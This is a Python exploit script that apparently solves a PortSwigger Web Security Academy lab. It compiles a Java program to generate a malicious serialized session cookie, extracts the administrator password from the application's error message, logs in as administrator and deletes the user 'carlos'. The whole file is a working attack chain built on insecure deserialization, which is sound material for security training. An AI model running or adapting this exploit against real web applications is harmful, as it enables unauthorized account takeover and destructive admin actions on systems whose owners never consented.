import requests as r
from bs4 import BeautifulSoup
import re
import subprocess

def compileJava():
    coompile_java = subprocess.run(['javac', 'Main.java'], capture_output=True, text=True)
    if coompile_java.returncode !=0:
        print ("[-] Java Compilation Failed")
        print (coompile_java.stderr)
        exit(1)

    run_process = subprocess.run(['java', 'Main'], capture_output=True, text=True)
    if run_process.returncode != 0:
        print("[-] Java Execution failed:")
        print(run_process.stderr)
        exit(1)

    output = run_process.stdout.strip()
    serialized_output = re.search(r"Serialized object:\s*(rO0ABXNy[^\s]+)", output)
    if serialized_output:
        return serialized_output.group(1)
    else:
        print("[-] Error Obtaining Serialized Data")

def extractPassword(response):
    soup = BeautifulSoup(response.content, 'html.parser')
    error_message_div = soup.find('p', class_='is-warning')
    message_to_filter = error_message_div.get_text()
    if error_message_div:
        match = re.search(r'"(.+?)"', message_to_filter)
        if match:
            extracted_text = match.group(1)
            print("[+] Password Found: " +extracted_text)
            return extracted_text
        else:
            print("[-] No password returned")
    else:
        print("[-] No Error thrown")

def main():
    host = "https://0aef0082043691e48173021800fc00b6.web-security-academy.net/"
    print("[+] Trying to Compile the Java Code to get the Serialized")
    serialized_cookie = compileJava()
    if serialized_cookie:
        print ("[+] Obatined Serialized Cookie: " +serialized_cookie)
        cookie = {"session": serialized_cookie}
        session = r.Session()
        # Get the password
        response = session.get(host, cookies=cookie)
        password = extractPassword(response)

        # Login with admin and the password
        if password:
            try:
                admin_creds = {"username": "administrator", "password": password}
                response = session.post(host+"login",data=admin_creds)
                if response.status_code == 200:
                    delete_user = session.get(host+"admin/delete?username=carlos")
                    if delete_user.status_code == 200:
                        print("[+] Succesfully deleted User Carlos, Challenge Completed")
                    else:
                        print("[-] User Not Deleted")
                else:
                    print (response.status_code)
            except Exception as e:
                print(e)
        else:
            print("Error")
    else:
        print("Problem with Obtainining Seiralized Code. Check the Java Code")




if __name__ == "__main__":
    main()